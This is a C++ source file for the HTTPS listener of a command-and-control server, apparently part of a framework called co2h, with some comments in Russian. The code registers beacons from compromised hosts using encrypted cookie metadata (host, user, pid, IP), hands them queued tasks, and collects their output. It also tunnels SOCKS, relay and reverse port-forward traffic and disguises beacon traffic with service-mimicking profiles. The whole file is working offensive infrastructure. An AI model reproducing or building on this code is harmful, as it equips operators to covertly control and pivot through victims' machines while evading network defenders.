#include "HttpsListener.hpp"
#include "BeaconCrypto.hpp"
#include "RsaOaep.hpp"
#include "../../Core.hpp"
#include "../../core/SessionRegistry.hpp"
#include "../../core/TaskQueue.hpp"

namespace server = co2h::server;

#include <co2h/framing.hpp>
#include <co2h/kv.hpp>
#include <co2h/proto.hpp>
#include <spdlog/spdlog.h>

namespace co2h::server::https { using namespace ::co2h::kv; }

#include <array>
#include <chrono>
#include <memory>
#include <sstream>
#include <string>
#include <string_view>
#include <vector>

namespace co2h::server::https {

using SslStream = asio::ssl::stream<asio::ip::tcp::socket>;

namespace {

struct HttpRequest {
    std::string method;
    std::string path;     // raw path including query
    std::string query;    // after '?'
    std::vector<std::pair<std::string, std::string>> headers;
    Bytes       body;

    std::string header(std::string_view name) const {
        for (auto& [k, v] : headers) {
            if (k.size() == name.size()) {
                bool eq = true;
                for (std::size_t i = 0; i < k.size(); ++i) {
                    char a = k[i], b = name[i];
                    if (a >= 'A' && a <= 'Z') a += 32;
                    if (b >= 'A' && b <= 'Z') b += 32;
                    if (a != b) { eq = false; break; }
                }
                if (eq) return v;
            }
        }
        return {};
    }

    std::string cookie(std::string_view name) const {
        std::string h = header("Cookie");
        std::size_t pos = 0;
        while (pos < h.size()) {
            auto eq = h.find('=', pos);
            if (eq == std::string::npos) break;
            std::size_t end = h.find(';', eq);
            if (end == std::string::npos) end = h.size();
            std::string_view key{h.data() + pos, eq - pos};
            while (!key.empty() && key.front() == ' ') key.remove_prefix(1);
            if (key == name) {
                return std::string{h.data() + eq + 1, end - eq - 1};
            }
            pos = end + 1;
        }
        return {};
    }

    std::string query_param(std::string_view name) const {
        std::size_t pos = 0;
        while (pos < query.size()) {
            auto eq = query.find('=', pos);
            if (eq == std::string::npos) break;
            std::size_t end = query.find('&', eq);
            if (end == std::string::npos) end = query.size();
            std::string_view key{query.data() + pos, eq - pos};
            if (key == name) {
                return std::string{query.data() + eq + 1, end - eq - 1};
            }
            pos = end + 1;
        }
        return {};
    }

    std::string path_only() const {
        auto q = path.find('?');
        return q == std::string::npos ? path : path.substr(0, q);
    }
};

std::string random_hex_id() {
    std::array<std::uint8_t, 8> raw{};
    co2h::crypto::random_bytes(raw.data(), raw.size());
    return co2h::hex_encode({raw.data(), raw.size()});
}

class HttpConnection : public std::enable_shared_from_this<HttpConnection> {
public:
    HttpConnection(std::shared_ptr<HttpsListener> l, SslStream stream)
        : listener_(std::move(l)), stream_(std::move(stream)) {}

    void start() {
        auto self = shared_from_this();
        stream_.async_handshake(asio::ssl::stream_base::server,
            [this, self](const std::error_code& ec) {
                if (ec) return;
                read_request();
            });
    }

private:
    void read_request() {
        auto self = shared_from_this();
        buf_.resize(16 * 1024);
        stream_.async_read_some(asio::buffer(buf_),
            [this, self](const std::error_code& ec, std::size_t n) {
                if (ec) return;
                req_raw_.append(reinterpret_cast<const char*>(buf_.data()), n);
                if (!headers_done_) {
                    auto sep = req_raw_.find("\r\n\r\n");
                    if (sep == std::string::npos) {
                        if (req_raw_.size() > 64 * 1024) return;
                        read_request();
                        return;
                    }
                    if (!parse_headers(req_raw_.substr(0, sep))) return;
                    body_off_     = sep + 4;
                    headers_done_ = true;
                    auto cl = req_.header("Content-Length");
                    body_need_ = cl.empty() ? 0 : std::stoul(cl);
                }
                if (req_raw_.size() - body_off_ >= body_need_) {
                    req_.body.assign(
                        reinterpret_cast<const std::uint8_t*>(
                            req_raw_.data() + body_off_),
                        reinterpret_cast<const std::uint8_t*>(
                            req_raw_.data() + body_off_ + body_need_));
                    dispatch();
                } else {
                    read_request();
                }
            });
    }

    bool parse_headers(const std::string& h) {
        auto line_end = h.find("\r\n");
        if (line_end == std::string::npos) return false;
        auto line = h.substr(0, line_end);
        auto sp1 = line.find(' ');
        auto sp2 = line.find(' ', sp1 + 1);
        if (sp1 == std::string::npos || sp2 == std::string::npos) return false;
        req_.method = line.substr(0, sp1);
        req_.path   = line.substr(sp1 + 1, sp2 - sp1 - 1);
        auto qpos = req_.path.find('?');
        if (qpos != std::string::npos) req_.query = req_.path.substr(qpos + 1);

        std::size_t pos = line_end + 2;
        while (pos < h.size()) {
            auto eol = h.find("\r\n", pos);
            if (eol == std::string::npos) eol = h.size();
            auto colon = h.find(':', pos);
            if (colon != std::string::npos && colon < eol) {
                std::string name = h.substr(pos, colon - pos);
                std::string val  = h.substr(colon + 1, eol - colon - 1);
                while (!val.empty() && (val.front() == ' ' || val.front() == '\t'))
                    val.erase(val.begin());
                req_.headers.emplace_back(std::move(name), std::move(val));
            }
            if (eol == h.size()) break;
            pos = eol + 2;
        }
        return true;
    }

    // Отрезает query-строку от URI профиля для сравнения с path_only().
    // Профили могут указывать URI с параметрами (?alt=media, ?uploadType=...)
    // для реалистичности бикон-трафика; маршрутизация опирается только на путь.
    static std::string prof_path(const std::string& uri) {
        auto q = uri.find('?');
        return q == std::string::npos ? uri : uri.substr(0, q);
    }

    void dispatch() {
        const auto& prof = listener_->profile();
        auto path = req_.path_only();

        if (req_.method == prof.get.verb && path == prof_path(prof.get.uri_checkin)) {
            handle_checkin();
            return;
        }
        if (req_.method == prof.get.verb && path == prof_path(prof.get.uri_task)) {
            handle_task_poll();
            return;
        }
        if (req_.method == prof.post.verb && path == prof_path(prof.post.uri)) {
            handle_post_output();
            return;
        }

        respond(404, "text/plain", BytesView{
            reinterpret_cast<const std::uint8_t*>("not found"), 9});
    }

    void handle_checkin() {
        auto cookie = req_.cookie(listener_->profile().get.metadata_cookie);
        if (cookie.empty()) {
            spdlog::warn("https checkin: missing '{}' cookie",
                         listener_->profile().get.metadata_cookie);
            respond(204, "text/plain", {});
            return;
        }
        auto blob = b64url_decode(cookie);
        if (blob.empty()) {
            spdlog::warn("https checkin: b64url_decode failed (cookie len={})",
                         cookie.size());
            respond(204, "text/plain", {});
            return;
        }
        auto pt = open_frame(listener_->listener_key(), {blob.data(), blob.size()});
        if (!pt) {
            spdlog::warn("https checkin: AES-GCM decrypt failed (blob={}b) — "
                         "wrong listener key?", blob.size());
            respond(204, "text/plain", {});
            return;
        }
        kv::Reader r{{pt->data(), pt->size()}};
        BeaconSession s;
        s.id       = random_hex_id();
        s.listener = listener_->name();
        s.hostname    = std::string{r.get_str("host").value_or("")};
        s.username    = std::string{r.get_str("user").value_or("")};
        s.pid         = r.get_u32("pid").value_or(0);
        s.arch        = std::string{r.get_str("arch").value_or("x64")};
        s.os          = std::string{r.get_str("os").value_or("windows")};
        s.internal_ip = std::string{r.get_str("ip").value_or("")};
        s.parent_id   = std::string{r.get_str("parent_id").value_or("")};
        {
            std::error_code ec;
            auto ep = stream_.lowest_layer().remote_endpoint(ec);
            if (!ec) {
                const auto addr = ep.address().to_string();
                s.external_ip = addr;
                if (s.internal_ip.empty()) s.internal_ip = addr;
            }
        }
        s.first_seen  = s.last_seen = std::chrono::system_clock::now();

        // RSA-OAEP-wrapped per-session key. Beacon generates 32 random bytes,
        // encrypts with the listener's public key and ships them in metadata.
        // Falls back to the shared listener_key only if the beacon was built
        // without a public key (legacy artifacts).
        s.session_key = listener_->listener_key();
        auto wrapped = r.get_bytes("wrapped_key");
        if (wrapped && !listener_->rsa_priv_blob().empty()) {
            auto dec = rsa_oaep_decrypt(listener_->rsa_priv_blob(),
                                        {wrapped->data(), wrapped->size()});
            if (dec && dec->size() == s.session_key.size()) {
                std::copy(dec->begin(), dec->end(), s.session_key.begin());
            } else {
                spdlog::warn("https checkin: wrapped_key decrypt failed "
                             "(size={}); using listener_key fallback",
                             wrapped->size());
            }
        }

        listener_->core()->sessions().create_or_update(s);
        spdlog::info("beacon checkin id={} host={} user={} listener={}",
                     s.id, s.hostname, s.username, s.listener);

        kv::Writer w;
        w.put_str("beacon_id", s.id);
        auto enc = seal_frame(listener_->listener_key(), w.finish());
        respond_wrapped(listener_->profile().server.status, enc);
    }

    void handle_task_poll() {
        auto sid = req_.cookie(listener_->profile().get.metadata_cookie);
        if (sid.empty()) sid = req_.query_param("sid");
        if (sid.empty()) {
            spdlog::warn("task poll: no sid cookie/param on {}", req_.path);
            respond(204, "text/plain", {});
            return;
        }
        auto sess = listener_->core()->sessions().get(sid);
        if (!sess) {
            spdlog::warn("task poll: unknown beacon sid='{}' (len={})",
                         sid, sid.size());
            respond(204, "text/plain", {});
            return;
        }
        sess->last_seen = std::chrono::system_clock::now();

        auto drained = listener_->core()->tasks().drain(sid);

        if (!drained.empty()) {
            // Relay-ответы приходят с частотой опроса дочернего бикона —
            // не логируем их чтобы не флудить лог.
            bool all_relay = std::all_of(drained.begin(), drained.end(),
                [](const auto& t){ return t.op == proto::TaskOp::RelayResp
                                       || t.op == proto::TaskOp::RelayStart
                                       || t.op == proto::TaskOp::RelayStop; });
            if (!all_relay)
                spdlog::info("task poll: beacon={} delivering {} task(s)",
                             sid, drained.size());
        }
        kv::Writer w;
        w.put_u32("count", static_cast<std::uint32_t>(drained.size()));
        for (std::size_t i = 0; i < drained.size(); ++i) {
            auto idx = std::to_string(i);
            w.put_u64("id_"      + idx, drained[i].id);
            w.put_u32("op_"      + idx, static_cast<std::uint32_t>(drained[i].op));
            w.put_bytes("payload_" + idx,
                        {drained[i].payload.data(), drained[i].payload.size()});
        }
        auto enc = seal_frame(sess->session_key, w.finish());
        respond_wrapped(listener_->profile().server.status, enc);
    }

    void handle_post_output() {
        auto sid = req_.cookie(listener_->profile().get.metadata_cookie);
        if (sid.empty()) sid = req_.query_param("sid");
        auto sess = listener_->core()->sessions().get(sid);
        if (!sess) {
            spdlog::warn("output post: unknown beacon sid='{}'", sid);
            respond(204, "text/plain", {});
            return;
        }
        sess->last_seen = std::chrono::system_clock::now();

        auto pt = open_frame(sess->session_key,
                             {req_.body.data(), req_.body.size()});
        if (!pt) {
            spdlog::warn("output post: decrypt failed beacon={} body={}b",
                         sid, req_.body.size());
            respond(400, "text/plain", {});
            return;
        }
        kv::Reader r{{pt->data(), pt->size()}};
        auto task_id = r.get_u64("task_id").value_or(0);
        auto out     = r.get_bytes("output").value_or(BytesView{});
        auto err     = r.get_str("error").value_or("");
        auto is_last = r.get_u32("is_last").value_or(1);
        auto resp    = r.get_u32("resp").value_or(2);

        static constexpr std::uint64_t kSocksMagic   = 0xFFFFFFFFFFFFFFFEULL;
        static constexpr std::uint64_t kRelayMagic   = 0xFFFFFFFFFFFFFFFDULL;
        static constexpr std::uint64_t kRportfwdMagic = 0xFFFFFFFFFFFFFFFCULL;

        // Relay/SOCKS/rportfwd кадры высокочастотные — не логируем их отдельно.
        if (task_id != kSocksMagic && task_id != kRelayMagic && task_id != kRportfwdMagic)
            spdlog::info("output post: beacon={} {}b", sid, pt->size());

        if (task_id == kSocksMagic) {
            if (!out.empty())
                listener_->core()->route_socks_output(sess->id, out);
        } else if (task_id == kRelayMagic) {
            if (!out.empty())
                listener_->core()->route_relay_output(sess->id, out);
        } else if (task_id == kRportfwdMagic) {
            if (!out.empty())
                listener_->core()->route_rportfwd_output(sess->id, out);
        } else {
            // Broadcast to operators.
            kv::Writer w;
            w.put_str("beacon_id", sess->id);
            w.put_u64("task_id", task_id);
            w.put_u32("is_last", is_last);
            w.put_u32("resp",    resp);
            if (!err.empty()) w.put_str("error", std::string{err});
            if (!out.empty()) w.put_bytes("output", out);
            listener_->core()->broadcast_event(proto::EventCategory::Tasks, w.finish());
        }

        respond(listener_->profile().server.status, "text/plain", {});
    }

    void respond_wrapped(int status, BytesView payload) {
        auto b64 = b64url_encode(payload);
        Bytes body;
        const auto& srv = listener_->profile().server;
        body.insert(body.end(), srv.wrap_prefix.begin(), srv.wrap_prefix.end());
        body.insert(body.end(), b64.begin(), b64.end());
        body.insert(body.end(), srv.wrap_suffix.begin(), srv.wrap_suffix.end());
        respond(status, listener_->profile().server.content_type,
                {body.data(), body.size()});
    }

    void respond(int status, std::string_view ctype, BytesView body) {
        std::ostringstream hs;
        hs << "HTTP/1.1 " << status << " OK\r\n"
           << "Content-Type: " << ctype << "\r\n"
           << "Content-Length: " << body.size() << "\r\n"
           << "Connection: close\r\n";
        for (auto& [k, v] : listener_->profile().server.headers)
            hs << k << ": " << v << "\r\n";
        hs << "\r\n";
        auto head = hs.str();
        out_.clear();
        out_.reserve(head.size() + body.size());
        out_.insert(out_.end(), head.begin(), head.end());
        out_.insert(out_.end(), body.begin(), body.end());
        auto self = shared_from_this();
        asio::async_write(stream_, asio::buffer(out_),
            [self](const std::error_code&, std::size_t) {
                std::error_code ec;
                self->stream_.lowest_layer().close(ec);
            });
    }

    std::shared_ptr<HttpsListener> listener_;
    SslStream   stream_;
    Bytes       buf_;
    std::string req_raw_;
    bool        headers_done_ = false;
    std::size_t body_off_ = 0;
    std::size_t body_need_ = 0;
    HttpRequest req_;
    Bytes       out_;
};

} // namespace

HttpsListener::HttpsListener(std::shared_ptr<Core> core, HttpsConfig cfg)
    : core_(std::move(core)), cfg_(std::move(cfg)), acc_(core_->io()) {}

void HttpsListener::init_tls() {
    tls_.set_options(asio::ssl::context::default_workarounds
                   | asio::ssl::context::no_sslv2
                   | asio::ssl::context::no_sslv3
                   | asio::ssl::context::no_tlsv1
                   | asio::ssl::context::no_tlsv1_1);
    tls_.use_certificate_chain_file(cfg_.cert_file.string());
    tls_.use_private_key_file(cfg_.key_file.string(), asio::ssl::context::pem);
}

void HttpsListener::start() {
    init_tls();
    asio::ip::tcp::endpoint ep{
        asio::ip::make_address(cfg_.bind_host), cfg_.bind_port};
    acc_.open(ep.protocol());
    acc_.set_option(asio::ip::tcp::acceptor::reuse_address(true));
    acc_.bind(ep);
    acc_.listen();
    spdlog::info("https listener '{}' on {}", cfg_.name, bind_addr());
    do_accept();
}

void HttpsListener::stop() {
    std::error_code ec;
    acc_.close(ec);
}

void HttpsListener::do_accept() {
    auto self = shared_from_this();
    auto sock = std::make_shared<asio::ip::tcp::socket>(core_->io());
    acc_.async_accept(*sock, [this, self, sock](const std::error_code& ec) {
        if (ec) {
            if (ec != asio::error::operation_aborted)
                spdlog::warn("https '{}' accept: {}", cfg_.name, ec.message());
            return;
        }
        auto stream = SslStream{std::move(*sock), tls_};
        auto conn = std::make_shared<HttpConnection>(self, std::move(stream));
        conn->start();
        do_accept();
    });
}

}
